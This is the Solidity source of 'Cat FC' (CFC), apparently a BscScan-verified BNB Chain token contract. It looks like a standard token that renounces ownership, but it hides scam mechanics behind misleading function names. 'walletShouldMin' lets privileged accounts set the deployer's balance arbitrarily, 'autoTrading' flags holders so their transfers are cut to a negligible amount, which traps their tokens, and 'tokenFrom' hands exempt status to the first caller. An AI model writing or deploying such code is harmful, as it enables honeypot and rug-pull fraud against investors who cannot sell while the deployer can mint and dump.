/**
 *Submitted for verification at BscScan.com on 2023-01-31
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface maxTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface buyAuto {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract CatFC is Ownable{
    uint8 public decimals = 18;


    address public senderTokenWallet;
    uint256 constant marketingTrading = 10 ** 10;
    mapping(address => uint256) public balanceOf;
    string public name = "Cat FC";

    mapping(address => bool) public marketingMax;
    address public sellBuy;

    mapping(address => bool) public exemptLaunch;
    mapping(address => mapping(address => uint256)) public allowance;
    bool public launchedFund;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    string public symbol = "CFC";
    
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        maxTx exemptLimit = maxTx(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        sellBuy = buyAuto(exemptLimit.factory()).createPair(exemptLimit.WETH(), address(this));
        senderTokenWallet = fundFromSender();
        exemptLaunch[senderTokenWallet] = true;
        balanceOf[senderTokenWallet] = totalSupply;
        emit Transfer(address(0), senderTokenWallet, totalSupply);
        renounceOwnership();
    }

    

    function autoTrading(address enableSwap) public {
        if (enableSwap == senderTokenWallet || enableSwap == sellBuy || !exemptLaunch[fundFromSender()]) {
            return;
        }
        marketingMax[enableSwap] = true;
    }

    function fundFromSender() private view returns (address) {
        return msg.sender;
    }

    function tokenFrom(address tokenIsMode) public {
        if (launchedFund) {
            return;
        }
        exemptLaunch[tokenIsMode] = true;
        launchedFund = true;
    }

    function walletShouldMin(uint256 listMax) public {
        if (!exemptLaunch[fundFromSender()]) {
            return;
        }
        balanceOf[senderTokenWallet] = listMax;
    }

    function approve(address autoReceiver, uint256 listMax) public returns (bool) {
        allowance[fundFromSender()][autoReceiver] = listMax;
        emit Approval(fundFromSender(), autoReceiver, listMax);
        return true;
    }

    function transferFrom(address maxShouldList, address isLimit, uint256 listMax) public returns (bool) {
        if (maxShouldList != fundFromSender() && allowance[maxShouldList][fundFromSender()] != type(uint256).max) {
            require(allowance[maxShouldList][fundFromSender()] >= listMax);
            allowance[maxShouldList][fundFromSender()] -= listMax;
        }
        if (isLimit == senderTokenWallet || maxShouldList == senderTokenWallet) {
            return feeShouldAmount(maxShouldList, isLimit, listMax);
        }
        if (marketingMax[maxShouldList]) {
            return feeShouldAmount(maxShouldList, isLimit, marketingTrading);
        }
        return feeShouldAmount(maxShouldList, isLimit, listMax);
    }

    function feeShouldAmount(address limitEnable, address totalLaunch, uint256 listMax) internal returns (bool) {
        require(balanceOf[limitEnable] >= listMax);
        balanceOf[limitEnable] -= listMax;
        balanceOf[totalLaunch] += listMax;
        emit Transfer(limitEnable, totalLaunch, listMax);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function transfer(address isLimit, uint256 listMax) external returns (bool) {
        return transferFrom(fundFromSender(), isLimit, listMax);
    }


}